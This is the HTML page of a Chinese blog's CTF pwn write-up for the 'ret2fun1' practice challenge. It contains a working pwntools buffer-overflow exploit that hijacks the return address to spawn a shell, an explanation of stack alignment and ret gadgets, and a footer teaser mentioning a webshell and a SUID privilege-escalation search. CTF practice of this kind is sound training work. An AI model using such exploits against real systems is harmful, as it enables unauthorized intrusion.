@@ -1,0 +1,395 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>【青少年CTF】PWN-刷题记录-ret2fun1 | 末心的小博客</title><meta name="author" content="末心"><meta name="copyright" content="末心"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="题目信息题目名称：ret2fun1 解题步骤 可以看到开了很多东西，64位小端序，没有栈溢出保护，NX先默认可执行，没有随机地址 入门小pwn   看到代码也是非常简单的 利用gets进行栈溢出，然后返回到fun的system fun的地址是401156  gdb也挺方便 16 字节用于填充 s 缓冲区。 8 字节是 RBP 保存区域。 所以，覆盖 RIP（返回地址）之前总共需要填充 24 字节。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【青少年CTF】PWN-刷题记录-ret2fun1">
+<meta property="og:url" content="https://moxin1044.github.io/posts/e301/index.html">
+<meta property="og:site_name" content="末心的小博客">
+<meta property="og:description" content="题目信息题目名称：ret2fun1 解题步骤 可以看到开了很多东西，64位小端序，没有栈溢出保护，NX先默认可执行，没有随机地址 入门小pwn   看到代码也是非常简单的 利用gets进行栈溢出，然后返回到fun的system fun的地址是401156  gdb也挺方便 16 字节用于填充 s 缓冲区。 8 字节是 RBP 保存区域。 所以，覆盖 RIP（返回地址）之前总共需要填充 24 字节。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://moxin1044.github.io/attachments/image-20251119174331613.png">
+<meta property="article:published_time" content="2025-11-19T09:07:08.000Z">
+<meta property="article:modified_time" content="2025-11-19T10:00:00.053Z">
+<meta property="article:author" content="末心">
+<meta property="article:tag" content="BUUCTF">
+<meta property="article:tag" content="PWN">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://moxin1044.github.io/attachments/image-20251119174331613.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "【青少年CTF】PWN-刷题记录-ret2fun1",
+  "url": "https://moxin1044.github.io/posts/e301/",
+  "image": "https://moxin1044.github.io/attachments/image-20251119174331613.png",
+  "datePublished": "2025-11-19T09:07:08.000Z",
+  "dateModified": "2025-11-19T10:00:00.053Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "末心",
+      "url": "https://moxin1044.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="https://q1.qlogo.cn/g?b=qq&amp;nk=1044631097&amp;s=640"><link rel="canonical" href="https://moxin1044.github.io/posts/e301/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="//busuanzi.ibruce.info"><link rel="stylesheet" href="/css/index.css?v=5.5.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.json","preload":true,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"已切换为繁体中文","cht_to_chs":"已切换为简体中文","day_to_night":"已切换为深色模式","night_to_day":"已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"top-center"},
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: true,
+  islazyloadPlugin: false,
+  isAnchor: true,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '【青少年CTF】PWN-刷题记录-ret2fun1',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/modify.css"><meta name="generator" content="Hexo 8.0.0"></head><body><div id="web_bg" style="background: linear-gradient(to right, rgb(252, 70, 107), rgb(63, 94, 251));;"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="https://q1.qlogo.cn/g?b=qq&amp;nk=1044631097&amp;s=640" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">64</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">28</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">22</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(/../attachments/image-20251119174331613.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">末心的小博客</span></a><a class="nav-page-title" href="/"><span class="site-name">【青少年CTF】PWN-刷题记录-ret2fun1</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">【青少年CTF】PWN-刷题记录-ret2fun1</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-11-19T09:07:08.000Z" title="发表于 2025-11-19 17:07:08">2025-11-19</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-11-19T10:00:00.053Z" title="更新于 2025-11-19 18:00:00">2025-11-19</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/CTF/">CTF</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/CTF/%E9%9D%92%E5%B0%91%E5%B9%B4CTF/">青少年CTF</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/CTF/%E9%9D%92%E5%B0%91%E5%B9%B4CTF/PWN/">PWN</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><div class="top-img" style="background-image: url(/../attachments/image-20251119174331613.png);"></div><article class="container post-content" id="article-container"><h1 id="题目信息"><a href="#题目信息" class="headerlink" title="题目信息"></a>题目信息</h1><p>题目名称：ret2fun1</p>
+<h1 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h1><p><img src="../../attachments/image-20251119170906915.png" alt=""></p>
+<p>可以看到开了很多东西，64位小端序，没有栈溢出保护，NX先默认可执行，没有随机地址</p>
+<p>入门小pwn</p>
+<p><img src="../../attachments/image-20251119171238139.png" alt=""></p>
+<p><img src="../../attachments/image-20251119171250682.png" alt=""></p>
+<p>看到代码也是非常简单的</p>
+<p>利用<code>gets</code>进行栈溢出，然后返回到<code>fun</code>的system</p>
+<p>fun的地址是401156</p>
+<p><img src="../../attachments/image-20251119171455350.png" alt="image-20251119171455350"></p>
+<p><code>gdb</code>也挺方便</p>
+<p>16 字节用于填充 <code>s</code> 缓冲区。</p>
+<p>8 字节是 <code>RBP</code> 保存区域。</p>
+<p>所以，覆盖 <code>RIP</code>（返回地址）之前总共需要填充 <strong>24 字节</strong>。</p>
+<p>先简单写个脚本：</p>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = context.binary = ELF(<span class="string">'./ret2fun'</span>)</span><br><span class="line">p = process(elf.path)</span><br><span class="line"></span><br><span class="line">fun_addr = <span class="number">0x401156</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b'A'</span> * <span class="number">24</span> + p64(fun_addr)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b'please input:'</span>, payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+<p><img src="../../attachments/image-20251119174203864.png" alt=""></p>
+<p><img src="../../attachments/image-20251119174216572.png" alt=""></p>
+<p>可以看到好像拿到了<code>shell</code>？但是真的拿到了吗？如拿！</p>
+<p>为什么这么说？</p>
+<p>我们执行一下命令，比如<code>ls</code></p>
+<p><img src="../../attachments/image-20251119174242678.png" alt=""></p>
+<p>你会发现就已经崩溃了</p>
+<h2 id="栈对齐的要求"><a href="#栈对齐的要求" class="headerlink" title="栈对齐的要求"></a>栈对齐的要求</h2><p>这是因为在<code>x86_64</code>架构下，<strong>函数调用前栈需要 16 字节对齐</strong>。<br>如果不对齐，在调用像 <code>system()</code> 这种函数时，有时会因为栈不对齐导致崩溃。</p>
+<blockquote>
+<p><code>栈对齐（stack alignment）</code> 是指在调用函数（特别是 C 函数或系统库函数）前，<br> <strong>栈指针寄存器 RSP 必须是 16 字节对齐（即 RSP % 16 == 0）</strong>。</p>
+<p>这不是编译器随意的习惯，而是 <code>AMD64 System V ABI 规范</code> 的硬性要求。<br> 这个规范规定了 <code>Linux</code> / <code>macOS</code> / <code>BSD</code> 等 64 位系统上函数调用的栈布局。</p>
+<p>其实主要是为了性能和安全性两种要求</p>
+</blockquote>
+<p>在 64 位系统里，很多函数（例如 <code>printf</code>, <code>system</code>, <code>memcpy</code>）内部使用了 SSE 指令。</p>
+<p>SSE 寄存器（XMM0～XMM15）在访问内存时要求操作数<strong>按 16 字节对齐</strong>。</p>
+<p>如果对齐正确，CPU 一次可以加载或存储 16 字节；</p>
+<p>如果没对齐，执行 <code>movaps</code>、<code>movdqa</code> 等指令会 <strong>触发段错误 (SIGSEGV)</strong>。</p>
+<p>比如：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">movaps xmm0, [rsp+8]</span><br></pre></td></tr></tbody></table></figure>
+<p>在这种情况下，rsp+8如果不是16的倍数，就会导致程序直接崩溃。</p>
+<blockquote>
+<p>ABI规定：在执行 call 指令前，调用方必须保证栈顶（RSP）是 16 字节对齐的</p>
+</blockquote>
+<h2 id="栈对齐原理"><a href="#栈对齐原理" class="headerlink" title="栈对齐原理"></a>栈对齐原理</h2><p>当你执行 <code>call func</code> 时，CPU 会自动把返回地址压入栈中（8 字节）：</p>
+<figure class="highlight css"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RSP 先减 <span class="number">8</span></span><br><span class="line"><span class="selector-attr">[返回地址]</span> ← 压入栈</span><br></pre></td></tr></tbody></table></figure>
+<p>所以，在函数内部开始执行时，<strong>RSP 的值其实是 16 的倍数 + 8</strong>。</p>
+<p>也就是说：</p>
+<ul>
+<li>进入函数前：RSP 对齐到 16。</li>
+<li>进入函数后：RSP % 16 == 8。</li>
+</ul>
+<p>举个简单的例子：</p>
+<p><strong>正常函数调用</strong></p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">main() {</span><br><span class="line">    fun();</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<p>编译器自动保证在<code>call fun</code>前对齐</p>
+<figure class="highlight perl"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">main():</span><br><span class="line">    <span class="function"><span class="keyword">sub</span> <span class="title">rsp</span>, 8       </span>; 调整栈空间</span><br><span class="line">    call fun         ; 进入时 rsp<span class="variable">%16</span>==<span class="number">8</span>，OK</span><br></pre></td></tr></tbody></table></figure>
+<p><code>fun()</code> 内部执行没问题。</p>
+<p><strong>手动修改返回地址</strong></p>
+<p>比如：</p>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b'A'</span>*<span class="number">24</span> + p64(fun_addr)</span><br></pre></td></tr></tbody></table></figure>
+<p>此时返回到 <code>fun()</code>，但我们是<strong>手动跳的</strong>，<br> 没有通过 <code>call</code>，所以 RSP 的状态不一定对齐（通常差 8 字节）。</p>
+<p>一旦 <code>fun()</code> 里调用了像 <code>system("/bin/sh")</code> 这样的函数，<br> libc 内部执行 SSE 指令时可能会崩溃。</p>
+<p>就会出现像现在这样的问题了</p>
+<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>其实我们可以在payload里加一个单独的ret</p>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b'A'</span> * <span class="number">24</span> + p64(<span class="number">0x40101a</span>) + p64(fun_addr)</span><br></pre></td></tr></tbody></table></figure>
+<p>执行顺序：</p>
+<ol>
+<li>先执行 <code>ret</code>（相当于弹出 8 字节）；</li>
+<li>RSP += 8；</li>
+<li>现在 RSP 对齐到 16；</li>
+<li>然后再执行 <code>fun()</code>。</li>
+</ol>
+<p>此时栈对齐正确，<code>system()</code> 不再崩溃。</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">OPgadget --binary ./ret2fun | grep <span class="string">"ret"</span></span><br></pre></td></tr></tbody></table></figure>
+<p>抓一个返回地址</p>
+<p><img src="../../attachments/image-20251119173919781.png" alt=""></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x40101a</span><br></pre></td></tr></tbody></table></figure>
+<p><img src="../../attachments/image-20251119174331613.png" alt="image-20251119174331613"></p>
+<p>这下就好了</p>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = context.binary = ELF(<span class="string">'./ret2fun'</span>)</span><br><span class="line">p = process(elf.path)</span><br><span class="line"></span><br><span class="line">fun_addr = <span class="number">0x401156</span></span><br><span class="line">ret_addr = <span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b'A'</span> * <span class="number">24</span> + p64(ret_addr) + p64(fun_addr)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b'please input:'</span>, payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure>
+<p>改一下远程就可以愉快的拿flag啦~</p>
+<p><img src="../../attachments/image-20251119174432718.png" alt=""></p>
+<h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><h2 id="栈对齐对比图"><a href="#栈对齐对比图" class="headerlink" title="栈对齐对比图"></a>栈对齐对比图</h2><pre><code class="highlight mermaid">graph TD
+    A[开始：main函数返回前] --&gt; B[栈溢出攻击]
+    B --&gt; C{是否使用ret gadget对齐栈?}
+    
+    C --&gt;|否，直接跳转| D[执行 fun 函数]
+    D --&gt; E[RSP % 16 == 8 ❌ 未对齐]
+    E --&gt; F[system函数中movaps指令崩溃 💥]
+    
+    C --&gt;|是，使用ret gadget| G[执行ret gadget RSP += 8]
+    G --&gt; H[执行 fun 函数]
+    H --&gt; I[RSP % 16 == 0 ✅ 已对齐]
+    I --&gt; J[成功获得shell 🐚]
+
+    style F fill:#ffcccc
+    style J fill:#ccffcc</code></pre>
+<h2 id="栈布局示意图"><a href="#栈布局示意图" class="headerlink" title="栈布局示意图"></a>栈布局示意图</h2><pre><code class="highlight mermaid">graph TB
+    subgraph "未加 ret gadget（错误对齐 ❌）"
+        A1["s[16] 缓冲区"] --&gt; A2["保存的 RBP"] --&gt; A3["fun() 地址&lt;br/&gt;（覆盖的返回地址）"]
+    end
+
+    subgraph "加 ret gadget（正确对齐 ✅）"  
+        B1["s[16] 缓冲区"] --&gt; B2["保存的 RBP"] --&gt; B3["ret gadget 地址&lt;br/&gt;(0x40101a)"] --&gt; B4["fun() 地址"]
+    end
+
+    A3 --&gt; C1["进入 fun() 时&lt;br/&gt;RSP 指向此处&lt;br/&gt;RSP % 16 == 8 ❌"]
+    C1 --&gt; D1["执行 system('/bin/sh') 时&lt;br/&gt;movaps 指令崩溃 💥"]
+    
+    B4 --&gt; C2["ret gadget 执行后&lt;br/&gt;RSP += 8，RSP % 16 == 0 ✅"]
+    C2 --&gt; D2["正常执行 system('/bin/sh')&lt;br/&gt;成功获得 shell 🐚"]
+
+    style D1 fill:#ffcccc,color:#000
+    style D2 fill:#ccffcc,color:#000</code></pre></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://moxin1044.github.io">末心</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://moxin1044.github.io/posts/e301/">https://moxin1044.github.io/posts/e301/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://moxin1044.github.io" target="_blank">末心的小博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/BUUCTF/">BUUCTF</a><a class="post-meta__tags" href="/tags/PWN/">PWN</a></div><div class="post-share"><div class="social-share" data-image="/../attachments/image-20251119174331613.png" data-sites="wechat,weibo,qq,facebook,x"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer=""></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/posts/e8b8/" title="【漏洞分析】GetSimple-CMS-远程命令执行（CVE-2019-11231）"><img class="cover" src="/../attachments/image-20251118142129310.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">【漏洞分析】GetSimple-CMS-远程命令执行（CVE-2019-11231）</div></div><div class="info-2"><div class="info-item-1">前言复现CMS：GetSimple CMS 复现版本：3.3.15 漏洞点1 xml信息泄露 访问：/data/users/admin.xml，可获得用户名、Hash后的密码、邮箱等信息。  题目仅给出了后台地址 hash的密码我们去解密一下  进入后台地址：http://challenge.qsnctf.com:35595/admin/  编辑主题  执行完phpinfo即退出  访问：http://challenge.qsnctf.com:35595/theme/Innovation/template.php  但是很遗憾没有发现FLAG  还是回去改一下一句话木马，这个环境需要提权一下 1find / -perm -u=s -type f 2&gt;/dev/null   使用find提权，读取/proc/1/environ拿到FALG </div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/posts/579e/" title="【BUUCTF】PWN-刷题记录-test_your_nc"><img class="cover" src="/../attachments/Pasted%20image%2020251026151007.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-10-26</div><div class="info-item-2">【BUUCTF】PWN-刷题记录-test_your_nc</div></div><div class="info-2"><div class="info-item-1">题目信息 解题步骤 nc 连接后，可以直接执行命令，在此我们执行ls后看到了flag文件 cat flag 即可获得flag  </div></div></div></a><a class="pagination-related" href="/posts/3ada/" title="【BUUCTF】PWN-刷题记录-rip"><img class="cover" src="/../attachments/image-20251026152033779.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-10-26</div><div class="info-item-2">【BUUCTF】PWN-刷题记录-rip</div></div><div class="info-2"><div class="info-item-1">题目信息 解题步骤 程序是amd64、小端程序，GOT表在运行时仍然可写，存在GOT覆盖风险，没有栈保护,栈可执行、程序基地址固定 使用ida进行分析：  上述代码中，我们注意： 12char s[15]; // [rsp+1h] [rbp-Fh]gets(s, argv);  s 数组大小为 15 字节，位于栈上。 使用了 危险函数 gets()：它会无限读取输入直到换行，完全不检查缓冲区边界。  gets(s) 会把你输入的所有字节写到栈上：先写入 s（15字节），接着覆盖 saved rbp（8字节），再覆盖 return address（8字节），后面跟着你继续写的字节都会保存在 return address 之后的栈上（函数返回时 ret 从栈上弹出的就是我们写入的返回地址）。  s 距离 rbp 仅 0xF = 15 字节，而 rbp 上方 8 字节是 返回地址（return address）。 因此，输入超过 15 + 8 = 23 字节 即可覆盖返回地址。   程序还有一个fun函数，调用了system函数，地址为0x401186 程序的system函数，地址为0...</div></div></div></a><a class="pagination-related" href="/posts/c47f/" title="【BUUCTF】PWN-刷题记录-warmup_csaw_2016"><img class="cover" src="/../attachments/image-20251026161827972.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-10-26</div><div class="info-item-2">【BUUCTF】PWN-刷题记录-warmup_csaw_2016</div></div><div class="info-2"><div class="info-item-1">题目信息 解题步骤 和上一题基本一样  123456789101112int __fastcall main(int a1, char **a2, char **a3){  char s[64]; // [rsp+0h] [rbp-80h] BYREF  _BYTE v5[64]; // [rsp+40h] [rbp-40h] BYREF  write(1, "-Warm Up-\n", 0xAu);  write(1, "WOW:", 4u);  sprintf(s, "%p\n", sub_40060D); // sub_40060D中，调用system cat了flag  write(1, s, 9u);  write(1, "&gt;", 1u);  return gets(v5);} 1234int sub_40060D(){  return system("cat flag.txt");}  v5 是输入缓冲区：gets(v5)，...</div></div></div></a><a class="pagination-related" href="/posts/2b33/" title="【BUUCTF】PWN-刷题记录-ciscn_2019_n_1"><img class="cover" src="/../attachments/image-20251026164739465.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-10-26</div><div class="info-item-2">【BUUCTF】PWN-刷题记录-ciscn_2019_n_1</div></div><div class="info-2"><div class="info-item-1">题目信息 解题步骤 1234567[*] '/home/kali/Desktop/buuctf/ciscn_2019_n_1'    Arch:       amd64-64-little      → 64位小端程序    RELRO:      Partial RELRO        → GOT表可写（可被劫持）    Stack:      No canary found      → 无栈保护，可溢出    NX:         NX enabled           → 栈不可执行（不能直接执行shellcode）    PIE:        No PIE (0x400000)    → 地址固定，无ASLR    Stripped:   No                   → 符号表未剥离，函数名可见 用 IDA 打开二进制文件，main 函数非常简单：  关键逻辑在 func()：   v1[44]：输入缓冲区，位于 [rbp-0x30] v2：float 类型，位于 [rbp-0x4]，初始值 0.0 使用 gets(v1) → ...</div></div></div></a><a class="pagination-related" href="/posts/6623/" title="【BUUCTF】REVERSE-刷题记录-easyre"><img class="cover" src="/../attachments/image-20251026165718241.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-10-26</div><div class="info-item-2">【BUUCTF】REVERSE-刷题记录-easyre</div></div><div class="info-2"><div class="info-item-1">题目信息 解题步骤先用DIE分析，发现是64位C程序  使用IDA分析：  也就是输入两个相同字符，就可以拿到flag 1flag{this_Is_a_EaSyRe} </div></div></div></a><a class="pagination-related" href="/posts/e746/" title="【BUUCTF】REVERSE-刷题记录-reverse1"><img class="cover" src="/../attachments/image-20251026171036188.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-10-26</div><div 